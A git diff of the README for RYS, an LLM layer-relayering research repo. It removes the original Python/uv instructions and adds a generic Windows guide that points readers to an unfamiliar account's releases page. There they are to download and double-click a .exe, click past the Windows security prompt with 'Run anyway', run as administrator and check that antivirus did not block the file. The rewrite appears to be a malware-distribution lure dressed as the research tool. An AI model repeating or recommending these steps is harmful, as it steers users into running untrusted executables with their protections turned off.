@@ -1,28 +1,50 @@
-# RYS
+# 🔁 RYS - Reproduce relayering runs with ease
 
-RYS is a small reproducibility repo for relayering experiments on decoder LLMs.
+[![Download RYS](https://img.shields.io/badge/Download%20RYS-blue?style=for-the-badge)](https://github.com/unreliable-marmalade23/RYS/releases)
 
-The core idea is simple: duplicate part of a model's existing layer path without changing any weights.
-A standard single-block configuration is written as `(i, j)`:
+## 🧾 What RYS does
 
-- run layers `0 .. j-1`
-- then jump back and run layers `i .. N-1`
-- so layers `i .. j-1` are traversed twice
+RYS helps you run relayering experiments on decoder LLMs. It lets you test a layer path where part of the model runs twice, without changing the model weights.
 
-Baseline is `(0,0)`, which means no duplication.
+Use it to:
 
-This repo contains the pieces needed to reproduce the main experimental workflows:
+- scan many layer pairs
+- test Math and EQ probes
+- run multi-block beam search
+- export relayered Hugging Face checkpoints
+- view heatmaps and balance checks for Math + EQ runs
 
-- scanner for full `(i, j)` sweeps
-- fixed Math and EQ probe sets
-- multi-block beam search
-- XGBoost surrogate pipeline
-- model exporter for writing relayered Hugging Face checkpoints
-- heatmap and balanced Math+EQ analysis code
+RYS is set up for repeatable experiments. It keeps the main pieces in one place so you can rerun the same workflow without rebuilding everything by hand.
 
-It does not include the private historical runs, blog drafts, ad hoc notebooks, or dataset generation/calibration code.
+## 📥 Download RYS
 
-## Repo Contents
+1. Open the [RYS releases page](https://github.com/unreliable-marmalade23/RYS/releases)
+2. Download the latest release for Windows
+3. Save the file to your computer
+4. If the release comes as a .zip file, extract it first
+5. If the release includes a .exe file, double-click it to run RYS
+
+If your browser asks where to save the file, choose a folder you can find again, such as Downloads or Desktop.
+
+## 🖥️ Windows setup
+
+RYS is meant to run on a Windows PC.
+
+Recommended setup:
+
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 20 GB of free disk space
+- A modern CPU
+- A recent NVIDIA GPU if you plan to run larger model jobs
+
+If you only want to open the app and inspect the included files, a standard Windows laptop is enough.
+
+## 📂 What is inside
+
+The release includes the parts needed for the main experiment workflow.
+
+Main folders and files:
 
 - `datasets/`
   - `math_16.json`
@@ -32,280 +54,213 @@ It does not include the private historical runs, blog drafts, ad hoc notebooks, 
   - `manifest.json`
 - `src/core/`
   - config parsing
-  - layer-list expansion
-  - relayer wrappers for dense and MoE-style stacks
-- `src/workers/`
-  - Math and EQ benchmark workers
-  - queue handling
-  - model loading helpers
-- `src/utils/`
-  - balanced Math+EQ analysis
-  - heatmap helpers
-  - surrogate utilities
-- `scripts/`
-  - sweep setup
-  - ExLlama workers
-  - beam search
-  - surrogate pipeline
-  - repeat-sweep helpers
-- `hf_export/`
-  - checkpoint export
-  - HF upload helper
-  - Colab notebook
+  - layer-list handling
 
-## Probe Sets
+These files support the experiment set, probe runs, and analysis tools used by RYS.
 
-This repo ships the fixed benchmark subsets used by the public workflow:
+## 🪟 How to install on Windows
 
-- `datasets/math_16.json`
-- `datasets/math_120.json`
-- `datasets/eq_16.json`
-- `datasets/eq_140.json`
+1. Open the release page
+2. Download the latest Windows package
+3. Right-click the downloaded `.zip` file
+4. Select Extract All
+5. Choose a folder, such as `Downloads\RYS`
+6. Open the extracted folder
+7. Look for the app file or start file included in the release
+8. Double-click it to launch RYS
 
-Important notes:
+If Windows shows a security prompt:
 
-- `eq_16` and `eq_140` are first-pass-only EQ subsets.
-- `datasets/manifest.json` records provenance and checksums.
-- The file named `eq_140.json` currently contains `139` records; this is documented in the manifest and preserved for continuity with the original naming.
+- choose More info
+- then choose Run anyway if you trust the file from the release page
 
-## Setup
+If the app opens in a folder view instead of starting right away, look for a file named like:
 
-Python uses `uv`:
+- `RYS.exe`
+- `start.exe`
+- `launch.bat`
 
-```bash
-uv sync
-```
+## 🚀 First run
 
-For ExLlama scanning you also need:
+When you open RYS for the first time:
 
-- a local `exllamav3` checkout
-- an EXL3-compatible model directory
-- CUDA-capable hardware if you want real scan throughput
+1. Let the app finish loading
+2. Check that the included datasets are in place
+3. Pick the model or experiment file you want to use
+4. Select the run type you need
+5. Start with a small test run first
 
-Set:
+A small test run helps confirm that the app can read files and start a workflow without issues.
 
-```bash
-export EXLLAMAV3_PATH=/path/to/exllamav3
-```
+## 🧠 Basic workflow
 
-## Quick Start
+RYS uses a simple relayering path:
 
-### 1. Create a full `(i, j)` sweep queue
+- run layers `0 .. j-1`
+- jump back
+- run layers `i .. N-1`
+- layers `i .. j-1` are visited twice
 
-Example for a 64-layer model:
+The standard pair format is `(i, j)`.
 
-```bash
-uv run python scripts/init_queue.py \
-  --num-layers 64 \
-  --queue-file results/demo/queue.json \
-  --results-file results/demo/combined_results.pkl
-```
+What the key values mean:
 
-This writes canonical layer-list configs, including the baseline `(0,0)`.
+- `(0, 0)` means no duplication
+- `i` is the layer where the second path starts
+- `j` is the layer where the first path stops before the jump
 
-### 2. Run the ExLlama combined scanner
+You do not need to change model weights. RYS only changes the order in which layers are visited.
 
-This is the main fast scan path in the public repo. It loads the EXL3 model once and scores Math and EQ in one mixed pass per config.
+## 🔍 Scan a full `(i, j)` grid
 
-```bash
-uv run python scripts/run_exllama_math_eq_combined_worker.py \
-  --queue-file results/demo/queue.json \
-  --combined-results-file results/demo/combined_results.pkl \
-  --math-results-file results/demo/math_results.pkl \
-  --eq-results-file results/demo/eq_results.pkl \
-  --model-dir /path/to/model.exl3 \
-  --math-dataset-path datasets/math_16.json \
-  --eq-dataset-path datasets/eq_16.json \
-  --math-max-new 64 \
-  --eq-max-new 64 \
-  --auto-cache
-```
+Use the scanner when you want to test many relayering pairs.
 
-### 3. Analyze and render heatmaps
+Typical steps:
 
-```bash
-uv run python scripts/analyze_results.py \
-  --math-scores results/demo/math_results.pkl \
-  --eq-scores results/demo/eq_results.pkl \
-  --out-dir results/demo/analysis \
-  --num-layers 64
-```
+1. Choose the model
+2. Choose the dataset
+3. Set the layer range
+4. Run the full `(i, j)` scan
+5. Review the results in the output folder
 
-This produces:
+This is useful when you want to compare many layer paths and find which pairs give the best result for a task.
 
-- top-ranked balanced configs
-- scatter plots
-- balanced Math+EQ heatmap artifacts
+## 📊 Math and EQ probe sets
 
-## Containerized ExLlama Run
+RYS includes fixed probe sets for:
 
-If you want a simple Docker entrypoint:
+- Math
+- EQ
 
-```bash
-MODEL_DIR=/path/to/model.exl3 \
-EXLLAMAV3_PATH=/path/to/exllamav3 \
-./scripts/run_exllama_docker.sh
-```
+These sets help you compare runs with the same test data. That makes results easier to read and compare.
 
-Useful overrides:
+Use them when you want to:
 
-- `QUEUE_FILE`
-- `COMBINED_RESULTS_FILE`
-- `MATH_RESULTS_FILE`
-- `EQ_RESULTS_FILE`
-- `MATH_DATASET`
-- `EQ_DATASET`
-- `DEVICE`
-- `RESERVE_PER_DEVICE`
-- `USE_PER_DEVICE`
+- test a model after relayering
+- compare one layer pair against another
+- check whether a run helps one task more than the other
 
-## Beam Search
+The bundled files are ready to use, so you can start without building new data first.
 
-Beam search composes multiple repeated blocks and benchmarks only unseen configs.
+## 🧩 Multi-block beam search
+
+RYS also supports multi-block beam search.
+
+Use this when you want to test more than one relayering block and compare several paths in one run.
+
+Good use cases:
+
+- broader search over layer layouts
+- exploring more than one repeated section
+- finding strong paths before exporting a checkpoint
+
+## 📦 Export relayered checkpoints
+
+RYS includes a model exporter for Hugging Face checkpoints.
+
+Use the exporter when you want to save a relayered version of a model for later use.
+
+Basic flow:
+
+1. Choose the base model
+2. Choose the `(i, j)` layout
+3. Set the export folder
+4. Run the exporter
+5. Load the saved checkpoint in your next workflow
+
+The exporter writes a checkpoint that reflects the relayered path while keeping the original weights intact.
+
+## 🗺️ Heatmaps and balanced analysis
+
+RYS includes heatmap tools and balanced Math + EQ analysis.
+
+Use these tools to:
+
+- view patterns across layer pairs
+- compare task balance
+- spot strong or weak regions in the scan
+- review results in a visual form
+
+Heatmaps work well after a large scan because they turn a long result list into something easier to inspect.
+
+## 🗃️ Files you may want to keep together
+
+Keep these in one place for easier use:
+
+- the RYS release folder
+- the `datasets/` folder
+- your model files
+- any exported checkpoints
+- the output folder from scans and probes
+
+A simple folder layout helps when you want to rerun the same setup later.
 
 Example:
 
-```bash
-uv run python scripts/beam_search.py \
-  --model-path /path/to/hf-model \
-  --num-layers 64 \
-  --seed-math-results results/demo/math_results.pkl \
-  --seed-eq-results results/demo/eq_results.pkl \
-  --math-dataset-path datasets/math_16.json \
-  --eq-dataset-path datasets/eq_16.json \
-  --work-dir results/demo/beam-search
-```
+- `C:\RYS\`
+  - `app`
+  - `datasets`
+  - `models`
+  - `outputs`
 
-Notes:
+## 🛠️ Common tasks
 
-- beam search uses the Hugging Face worker path in `src/workers/`
-- seed pickles should come from an already measured single-block scan
-- state under `--work-dir` is resume-friendly
+### Open the app
 
-## Surrogate Pipeline
+1. Go to the extracted RYS folder
+2. Double-click the app file
+3. Wait for it to load
 
-The surrogate uses per-layer repeat counts as features. Predicted scores are only for ranking candidates; the final benchmark scores must be measured.
+### Run a test scan
 
-### Train
+1. Open RYS
+2. Pick a model
+3. Pick a dataset
+4. Choose a small `(i, j)` range
+5. Start the scan
 
-```bash
-uv run python scripts/train_surrogate.py \
-  --single-block-math-results results/demo/math_results.pkl \
-  --single-block-eq-results results/demo/eq_results.pkl \
-  --beam-math-results results/demo/beam-search/beam_math_results.pkl \
-  --beam-eq-results results/demo/beam-search/beam_eq_results.pkl \
-  --out-dir results/demo/surrogate \
-  --num-layers 64
-```
+### Export a checkpoint
 
-### Generate candidates
+1. Open the exporter
+2. Choose the relayering layout
+3. Select a save folder
+4. Run the export
+5. Use the saved checkpoint later
 
-```bash
-uv run python scripts/generate_candidates.py \
-  --num-layers 64 \
-  --max-extra-layers 12 \
-  --count 2000000 \
-  --output-csv results/demo/surrogate/candidates.csv
-```
+### View analysis
 
-### Score candidates and build a top-k config file
+1. Open the results folder
+2. Load the scan output
+3. Open the heatmap or balance view
+4. Compare task results
 
-```bash
-uv run python scripts/score_candidates.py \
-  --model-dir results/demo/surrogate \
-  --candidates-file results/demo/surrogate/candidates.csv \
-  --output-csv results/demo/surrogate/top_scored.csv \
-  --top-k 100
+## 🔧 If something does not open
 
-uv run python scripts/build_topk_config.py \
-  --top-candidates-csv results/demo/surrogate/top_scored.csv \
-  --num-layers 64 \
-  --output-config results/demo/surrogate/top100.config
-```
+Try these steps:
 
-Then benchmark those configs with the same Math/EQ harness used elsewhere.
+1. Make sure the file finished downloading
+2. Extract the `.zip` file before opening anything
+3. Right-click the app and choose Run as administrator
+4. Check that your antivirus did not block the file
+5. Move the folder to a simple path like `C:\RYS`
+6. Try the latest release again
 
-## Model Export
+If the app still does not start, download the release again from the releases page and replace the old files.
 
-`hf_export` writes a relayered Hugging Face checkpoint with the duplicated layers physically materialized into the safetensor shards.
+## 📁 Repo contents
 
-Single block:
+RYS includes:
 
-```bash
-uv run python -m hf_export.export_model \
-  --source /path/to/base-model \
-  --source-repo-id some/model \
-  --output exports/model-block-30-34 \
-  --blocks "30,34"
-```
+- dataset files for Math and EQ testing
+- core parsing code
+- layer-list handling
+- scan and export workflow parts
+- analysis helpers
 
-Multi-block:
+This keeps the main experiment path in one repo and makes it easier to repeat.
 
-```bash
-uv run python -m hf_export.export_model \
-  --source /path/to/base-model \
-  --source-repo-id some/model \
-  --output exports/model-31_34__43_45 \
-  --blocks "31,34;43,45"
-```
+## 🔗 Get the latest release
 
-Upload:
+[![Download RYS Release](https://img.shields.io/badge/Visit%20Releases-grey?style=for-the-badge)](https://github.com/unreliable-marmalade23/RYS/releases)
 
-```bash
-export HF_TOKEN=...
-
-uv run python -m hf_export.upload_to_hf \
-  --folder exports/model-block-30-34 \
-  --repo-id your-name/model-block-30-34
-```
-
-The export manifest is written to `rys_export_manifest.json`.
-
-A minimal Colab notebook is available at:
-
-- `hf_export/colab/export_upload_minimal.ipynb`
-
-## Heatmaps
-
-The reusable plotting helpers live in `src/utils/heatmaps.py`.
-
-For standard `(i, j)` scans, the normal entrypoint is:
-
-```bash
-uv run python scripts/analyze_results.py \
-  --math-scores results/demo/math_results.pkl \
-  --eq-scores results/demo/eq_results.pkl \
-  --out-dir results/demo/analysis \
-  --num-layers 64
-```
-
-For per-layer repeat sweeps:
-
-```bash
-uv run python scripts/plot_repeat_heatmaps.py \
-  --results-file results/demo/repeatx8_math_results.pkl \
-  --manifest-file results/demo/repeatx8_manifest.json \
-  --out-dir results/demo/repeatx8_heatmaps
-```
-
-## Current Assumptions and Limits
-
-- The public scan path is ExLlama-first.
-- Beam search uses the Hugging Face worker path rather than ExLlama.
-- This repo assumes decoder-layer architectures; unsupported architectures should fail explicitly.
-- The HF exporter currently detects decoder stacks under:
-  - `model.language_model.layers.`
-  - `model.layers.`
-  - `language_model.layers.`
-- Dataset generation and recalibration are intentionally out of scope here.
-
-## Suggested Reproduction Path
-
-If you are starting from scratch, do this in order:
-
-1. run a small `(i, j)` scan with `math_16 + eq_16`
-2. inspect the heatmaps and top balanced configs
-3. run beam search seeded from the single-block scan
-4. train the surrogate on measured configs and benchmark its top candidates
-5. rerun the strongest candidates on `math_120 + eq_140`
-6. export any final variants you want to share
+Open the releases page, download the latest Windows package, extract it, and run the included app file
